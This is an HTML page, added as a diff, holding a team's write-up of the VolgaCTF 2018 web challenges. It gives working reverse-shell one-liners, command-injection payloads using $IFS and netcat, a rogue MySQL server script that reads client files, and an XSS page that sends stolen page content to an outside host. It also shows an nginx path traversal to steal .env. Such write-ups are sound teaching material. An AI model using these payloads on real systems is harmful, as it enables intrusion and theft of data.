@@ -1,0 +1,467 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Volgactf CTF 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#old-government-site-(solved-by-sasdf,-written-by-bookgin)">old-government-site-(solved-by-sasdf,-written-by-bookgin)</a>
+    
+                <a class="dropdown-item" href="#guess-book-(solved-by-shw15-and-sasdf,-written-by-bookgin)">guess-book-(solved-by-shw15-and-sasdf,-written-by-bookgin)</a>
+    
+                <a class="dropdown-item" href="#corp-monitoring-(unsolved,-written-by-bookgin,-special-thanks-to-admin-aleksey)">corp-monitoring-(unsolved,-written-by-bookgin,-special-thanks-to-admin-aleksey)</a>
+    
+                <a class="dropdown-item" href="#lazy-admin-(solved-by-sasdf-&-bookgin,-written-by-bookgin)">lazy-admin-(solved-by-sasdf-&-bookgin,-written-by-bookgin)</a>
+    
+                <a class="dropdown-item" href="#seo-kings-(solved-by-sasdf-&-bookgin,-written-by-bookgin)">seo-kings-(solved-by-sasdf-&-bookgin,-written-by-bookgin)</a>
+    
+                <a class="dropdown-item" href="#forgotten-task-(unsolved,-written-by-bookgin,-special-thanks-to-alexander-andreev)">forgotten-task-(unsolved,-written-by-bookgin,-special-thanks-to-alexander-andreev)</a>
+    
+                <a class="dropdown-item" href="#shop-request-(no-one-solved)">shop-request-(no-one-solved)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                forensics
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#old-government-site-(solved-by-sasdf,-written-by-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">old-government-site-(solved-by-sasdf,-written-by-bookgin)</span>
+            </a>
+    
+<a href="#guess-book-(solved-by-shw15-and-sasdf,-written-by-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">guess-book-(solved-by-shw15-and-sasdf,-written-by-bookgin)</span>
+            </a>
+    
+<a href="#corp-monitoring-(unsolved,-written-by-bookgin,-special-thanks-to-admin-aleksey)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">corp-monitoring-(unsolved,-written-by-bookgin,-special-thanks-to-admin-aleksey)</span>
+            </a>
+    
+<a href="#lazy-admin-(solved-by-sasdf-&-bookgin,-written-by-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">lazy-admin-(solved-by-sasdf-&-bookgin,-written-by-bookgin)</span>
+            </a>
+    
+<a href="#seo-kings-(solved-by-sasdf-&-bookgin,-written-by-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">seo-kings-(solved-by-sasdf-&-bookgin,-written-by-bookgin)</span>
+            </a>
+    
+<a href="#forgotten-task-(unsolved,-written-by-bookgin,-special-thanks-to-alexander-andreev)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">forgotten-task-(unsolved,-written-by-bookgin,-special-thanks-to-alexander-andreev)</span>
+            </a>
+    
+<a href="#shop-request-(no-one-solved)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">shop-request-(no-one-solved)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">forensics</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="volgactf-ctf-2018"><a class="header-link" href="#volgactf-ctf-2018"></a>Volgactf CTF 2018</h1>
+
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h2 id="reverse"><a class="header-link" href="#reverse"></a>reverse</h2>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="old-government-site-(solved-by-sasdf,-written-by-bookgin)"><a class="header-link" href="#old-government-site-(solved-by-sasdf,-written-by-bookgin)"></a>Old Government Site (solved by sasdf, written by bookgin)</h3>
+<p>By manipulting the parameter <code>page?id[]=18</code> to triger a error, we can see part of the source code. We soon found a hidden page at <code>page?id=18</code></p>
+<p>In the page we can POST a url, and the server will fetch it. The server agent is <code>ruby</code>. Take a look at <a href="">CVE-2017-17405</a>, ruby&#39;s feature.  So let&#39;s get a reverse shell.</p>
+<pre class="hljs"><code># POST the url
+|bash -c 'bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">1.2</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span>/<span class="hljs-number">5678</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>'</code></pre><p><code>cat /flag</code> and win!</p>
+<h3 id="guess-book-(solved-by-shw15-and-sasdf,-written-by-bookgin)"><a class="header-link" href="#guess-book-(solved-by-shw15-and-sasdf,-written-by-bookgin)"></a>Guess book (solved by shw15 and sasdf, written by bookgin)</h3>
+<p>People can create a post with title and content in the website, but no sign of XSS. We find lots of fake flags , as well as a shared Google doc link where people can make some fun there. </p>
+<p>Soon after, sasdf found the serach query is vulnerable to injection. Here is the PoC:</p>
+<pre class="hljs"><code><span class="hljs-comment"># bbb </span>
+GET <span class="hljs-string">'/search?search=" and "bbb HTTP/1.0\r\n\r\n'</span>
+<span class="hljs-comment"># 2</span>
+GET <span class="hljs-string">'/search?search=" and 1+1 or " HTTP/1.0\r\n\r\n
+# error
+GET '</span>/search?search=<span class="hljs-string">" AND 1+1 or "</span> HTTP/1.0\r\n\r\n</code></pre><p>But this is not MySQL, becasue MySQL is case insentitive. After a few tries, we still have no idea what kind of this SQL language is, and stuck for hours.</p>
+<p>Here comes the CTF saver. shw15 found it is <a href="https://www.lua.org/">Lua</a>. The syntax is simply <code>os.execute(&quot;sleep 10&quot;)</code>. </p>
+<p>Then that&#39;s all. We have RCE and discover the flag is in <code>/etc/passwd</code>.</p>
+<p>Once you know it&#39;s lua, the challenge becomes a piece of cake.</p>
+<h3 id="corp-monitoring-(unsolved,-written-by-bookgin,-special-thanks-to-admin-aleksey)"><a class="header-link" href="#corp-monitoring-(unsolved,-written-by-bookgin,-special-thanks-to-admin-aleksey)"></a>Corp monitoring (unsolved, written by bookgin, special thanks to admin Aleksey)</h3>
+<p>A monitoring server will monitor the host via this API The timestamp doesn&#39;t matter at all.</p>
+<p><code>http://corpmonitoring.quals.2018.volgactf.ru:5000/api/check_host?target=corpmonitoring.quals.2018.volgactf.ru&amp;_=1521894046582</code></p>
+<p>We tried some SQL/command injection but failed. 
+By scanning the host, we found listening ports 21(ftp),22(ssh),80(http),3306(mysql),5000(monitoring website).
+Also, we tried to make the host monitor our server, <code>/api/check_host?target=MYIP</code>. The monitoring procedure is:</p>
+<ul class="list">
+<li>TCP handshake with port 21</li>
+<li>TCP handshake with port 22</li>
+<li>HTTP Request to port 80 (no js engines)</li>
+<li>MySQL client <code>monitoring</code> with encrypted password connects to port 3306. <ul class="list">
+<li>If it logs in successfully, execute these queries:</li>
+<li>SET NAMES &#39;utf8&#39; COLLATE &#39;utf8_general_ci&#39;</li>
+<li>SET @@session.autocommit = OFF</li>
+<li>SHOW DATABASES</li>
+</ul>
+</li>
+</ul>
+<p>The first idea is to perform a man-in-the-middle attack, making the monitoring host connect to itself and intercepting the query.
+However, after the client logins to its own MySQL server, the databaseis empty. We found nothing interesting there.
+Soon after, the MySQL server is down because someone changes the password! We ask the admins, and the official said the MySQL server is not required to be up in this challenge.</p>
+<p>And... we stuck here for hours. We try to decrpyt the MySQL plaintext password, abuse the MySQL error message as the Flask-SQLAlchemy
+ backend will show the error message, but both methods seem impossible.</p>
+<p>After the competition ends, we ask one of the admins Aleksey about the solution. The main idea behind is <a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a>. Attack the client directly! What a cool idea!</p>
+<p>We make it work after the competition, which gets the flag in a jiffy. Here is the rogue MySQL sever code: Note that it uses <a href="https://github.com/arthaud/python3-pwntools">Python3-pwntools</a>.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># Python 3.6.4</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+server = listen(<span class="hljs-number">3306</span>)
+
+server.wait_for_connection()
+<span class="hljs-comment"># Server Greeting</span>
+server.send(bytes.fromhex(<span class="hljs-string">'4a0000000a352e372e32310007000000447601417b4f123700fff7080200ff8115000000000000000000005c121c5e6f7d387a4515755b006d7973716c5f6e61746976655f70617373776f726400'</span>))
+<span class="hljs-comment"># Client login request</span>
+print(server.recv())
+<span class="hljs-comment"># Server Response OK</span>
+server.send(bytes.fromhex(<span class="hljs-string">'0700000200000002000000'</span>))
+<span class="hljs-comment"># Client SQL query</span>
+print(server.recv())
+<span class="hljs-comment"># Server response with evil</span>
+query_ok = bytes.fromhex(<span class="hljs-string">'0700000200000002000000'</span>)
+dump_etc_passwd = bytes.fromhex(<span class="hljs-string">'0c000001fb2f6574632f706173737764'</span>)
+server.send(dump_etc_passwd)
+
+<span class="hljs-comment"># This contains the flag VolgaCTF{hoz3foh3wah6ohbaiphahg6ooxumu8ieNg7Tonoo}</span>
+print(server.recv())</code></pre><p>The key is to discover <strong>the client ability</strong> bit in the client login request. However, we forgot to do that :(</p>
+<pre class="hljs"><code>.... .... <span class="hljs-number">1.</span>.. .... = Can Use LOAD DATA LOCAL: Set</code></pre><p>This task has been solved by only 5 teams.</p>
+<h3 id="lazy-admin-(solved-by-sasdf-&-bookgin,-written-by-bookgin)"><a class="header-link" href="#lazy-admin-(solved-by-sasdf-&-bookgin,-written-by-bookgin)"></a>Lazy Admin (solved by sasdf &amp; bookgin, written by bookgin)</h3>
+<p>First, navigate to <code>robots.txt</code> and found <code>unauthorized_users.txt</code> is disallowed. The file contains username and password.</p>
+<p>Next, we are allowed to send a URL link to admin. However, the hostname will be overwritten. Thus it&#39;s unable to redirect the admin to other websites.</p>
+<p>We also note that the header <code>Access-Control-Allow-Credentials</code> is set, which is obvious a challenge about XSS attack.</p>
+<p>Then here is the key: If you&#39;re not logged in, access <code>profile.php</code> will redirect to <code>index.php?redir=profile.php</code>. It seems that we can abuse the redirection parameter.</p>
+<p>After a few tries, we found the url parser is vulnerable. <code>/index.php?redir=http:http://1.2.3.4/</code> will bypass the parser validation, redirecting to <code>http://1.2.3.4/</code>.</p>
+<p>Acctually, there are a number of ways to bypass the parser. Either <a href="https://blog.harold.kim/2018/03/volgactf-2018-lazy-admin-writeup">manipulating the host parameter</a> (by @stypr) or using <a href="https://gist.github.com/pich4ya/17dd5ef496c8fb11b79f7e7ea40d601f">space</a> (by pich4ya) can bypass the check.</p>
+<p>So the rest is easy. We create a page to steal the page content/cookies, and send the redirection link to admin. If the bot allows cross domain requests, we can steal the page content!</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"image"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">                                                                                                                                 
+<span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();                                                                                                          
+xhr.withCredentials = <span class="hljs-literal">true</span>;                                                                                                              
+xhr.open(<span class="hljs-string">'GET'</span>, <span class="hljs-string">'http://lazy-admin.quals.2018.volgactf.ru/profile.php'</span>, <span class="hljs-literal">false</span>);                                                          
+xhr.send(<span class="hljs-literal">null</span>);                                                                                                                          
+<span class="hljs-keyword">var</span> flag = btoa(xhr.responseText);                                                                                                       
+<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"image"</span>).src = <span class="hljs-string">"http://mywebsite.com/?a="</span>+flag;                                                           
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>Acctually it works. We just decode it and get the flag. It seems that the bot is using phantomjs with <code>-web-security=false</code>, which disables cross domain XHR.</p>
+<p>I spent lots of time on trying to bypass same origin policy, but I don&#39;t know they disable the feature. Next time I&#39;ll remember just give it a try first!</p>
+<h3 id="seo-kings-(solved-by-sasdf-&-bookgin,-written-by-bookgin)"><a class="header-link" href="#seo-kings-(solved-by-sasdf-&-bookgin,-written-by-bookgin)"></a>SEO kings (solved by sasdf &amp; bookgin, written by bookgin)</h3>
+<p>In the challenge, there is only one page with a form. We first manipulate some parameters to see if injection is possible. We accidently found a error page with lots of useful information by trying sending an array <code>site[]=</code>.</p>
+<pre class="hljs"><code><span class="hljs-string">curl </span><span class="hljs-string">'http://seo-kings.quals.2018.volgactf.ru:8080/'</span> -A <span class="hljs-string">"Mozilla"</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">'site[]=asd'</span></code></pre><p>So we have part of the ruby source code:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">runAdmin</span><span class="hljs-params">(site)</span></span>
+pid = Process.spawn(<span class="hljs-string">"phantomjs --web-security=no bot.js '"</span> +  URI.escape(site)  + <span class="hljs-string">"'"</span>)  
+<span class="hljs-keyword">begin</span>
+    Timeout.timeout(<span class="hljs-number">1</span>) <span class="hljs-keyword">do</span>
+    Process.wait(pid)
+  <span class="hljs-keyword">end</span> 
+<span class="hljs-keyword">rescue</span> Timeout::Error                                                           
+    Process.kill(<span class="hljs-string">'TERM'</span>, pid)
+<span class="hljs-keyword">end</span></code></pre><p>Phantomjs? Cool, it&#39;s XSS challenge. However, we tried various of XSS payload but they all failed to work. (<a href="https://github.com/NULLKrypt3rs/CTFs/blob/master/VolgaCTF-2018/SEOkings.md">NULLKrypt3rs</a> makes the XSS work, actually.) Therefore, we start to try other attacks.</p>
+<p>The ruby source uses <code>URI.escape(site)</code> to prevent command injection. It sounds sorts of weird. Why escape URI? It shoud escape command line parameters. That&#39;s the signal of possible command line injection.</p>
+<p>Here is the PoC:</p>
+<pre class="hljs"><code><span class="hljs-comment"># response time 0.4s</span>
+<span class="hljs-keyword">a</span><span class="hljs-string">';sleep$IFS$((0));'</span>
+<span class="hljs-comment"># response time 1.4s, because the process will timeout</span>
+<span class="hljs-keyword">a</span><span class="hljs-string">';sleep$IFS$((5));'</span></code></pre><p>The space is escaped, so <code>$IFS</code> is used as space:) The appending <code>$((0))</code> is to make the shell interpret <code>$IFS</code> variable properly.</p>
+<p>Thanks to @sasdf. Here is his payload:</p>
+<pre class="hljs"><code>POST <span class="hljs-string">payload:</span>
+site=a<span class="hljs-string">';$(nc$IFS$((1)).2.3.4$IFS$((9000)));'</span>
+
+Server <span class="hljs-string">side:</span>
+echo <span class="hljs-string">"ruby -e require('base64');system(Base64.decode64('...'))"</span> | ncat -lvp <span class="hljs-number">9000</span> --send-only
+
+Base64 <span class="hljs-string">payload:</span>
+curl <span class="hljs-string">http:</span><span class="hljs-comment">//127.0.0.1:8080/admin?token=d595462f496fd347796b60b605b72ff6 -L -vv 2&gt;&amp;1 | nc 1.2.3.4 9001</span></code></pre><p><a href="https://ctftime.org/writeup/9366">jinmo123</a>&#39;s payload is more elegant. The <code>nc</code> in busybox supports <code>-e</code> option, which can be used to pipe into shell to execute. </p>
+<p>We modified his payload to connect with reverse shell:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># Python 3.6.4</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-comment"># python3 pwntool</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+server = listen(<span class="hljs-number">12345</span>)
+server_result = listen(<span class="hljs-number">12346</span>)
+
+payload = <span class="hljs-string">"a';busybox$IFS$()nc$IFS$()1.2.3.4$IFS$()12345$IFS$()-esh;'"</span>
+requests.post(<span class="hljs-string">'http://seo-kings.quals.2018.volgactf.ru:8080/'</span>, data=dict(site=payload))
+
+cmd = <span class="hljs-string">"bash -c 'bash -i &gt;&amp; /dev/tcp/1.2.3.4/12346 0&gt;&amp;1'"</span>
+
+server.wait_for_connection()
+server.sendline(cmd)
+server.close()
+server_result.wait_for_connection()
+server_result.interactive()</code></pre><h3 id="forgotten-task-(unsolved,-written-by-bookgin,-special-thanks-to-alexander-andreev)"><a class="header-link" href="#forgotten-task-(unsolved,-written-by-bookgin,-special-thanks-to-alexander-andreev)"></a>Forgotten Task (unsolved, written by bookgin, special thanks to Alexander Andreev)</h3>
+<p>The challenge&#39;s backend is PHP + laravel. The cookies is encrypted with <code>APP_KEY</code> defined in <code>.env</code>.</p>
+<p>Additionally, the server&#39;s nginx configure file is provided:</p>
+<pre class="hljs"><code><span class="hljs-section">server</span> {
+    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span> default_server;
+    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">80</span> default_server;
+
+    <span class="hljs-attribute">root</span> /var/www/html;
+
+    <span class="hljs-attribute">index</span> index.php index.html;
+
+    <span class="hljs-attribute">server_name</span> _;
+
+    <span class="hljs-attribute">location</span> / {
+        <span class="hljs-attribute">root</span> /var/www/html;
+    }
+
+    <span class="hljs-attribute">location</span> /laravel {
+        <span class="hljs-attribute">alias</span> /var/www/laravel/public/;
+        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ <span class="hljs-variable">@laravel</span>;
+
+        <span class="hljs-attribute">location</span> <span class="hljs-regexp">~ \.php$</span> {
+            <span class="hljs-attribute">include</span> snippets/fastcgi-php.conf;
+            <span class="hljs-attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="hljs-variable">$request_filename</span>;
+            <span class="hljs-attribute">fastcgi_pass</span> unix:/run/php/php7.0-fpm.sock;
+        }
+    }
+
+    <span class="hljs-attribute">location</span> <span class="hljs-variable">@laravel</span> {
+        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/laravel/(.*)$</span> /laravel/index.php?<span class="hljs-variable">$1</span> <span class="hljs-literal">last</span>;
+    }
+}</code></pre><p>We got stuck here until the competition ended:( </p>
+<p>We ask Alexander Andreev for his solution: </p>
+<blockquote>
+<p> Well, first of all, there was nginx path traversal which allows to steal .env file with app_key (<a href="http://forgotten-task.quals.2018.volgactf.ru/laravel../.env">http://forgotten-task.quals.2018.volgactf.ru/laravel../.env</a>). Then you can find out that you recieve a cookie like volgactf_task_session. Is&#39;a base64 encoded json. Inside there was a field &quot;value&quot; and &quot;iv&quot; so you can decrypt via AES-256-CBC. There was a serialized PHP object. Then you can construct bad object and get a shell :)</p>
+</blockquote>
+<p>The key is to bypass nginx path matching and steal <code>.env</code> for the <code>APP_KEY</code>. </p>
+<p>It&#39;s worth mentioning that there is an <a href="https://github.com/yandex/gixy">Nginx configuration static analyzer</a>. The website may be vulnerable if there is misconfiguration of nginx config file.</p>
+<h3 id="shop-request-(no-one-solved)"><a class="header-link" href="#shop-request-(no-one-solved)"></a>Shop request (no one solved)</h3>
+<p><a href="https://github.com/shvetsovalex/ctf/tree/master/2018/VolgaCTF-quals/Shop%20quest">Original writeup by the author</a>.</p>
+<p>It looks like a challenging problem, XSS+SQLi+RCE. It&#39;s a pity we don&#39;t have much time to do it.</p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h2 id="forensics"><a class="header-link" href="#forensics"></a>forensics</h2>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
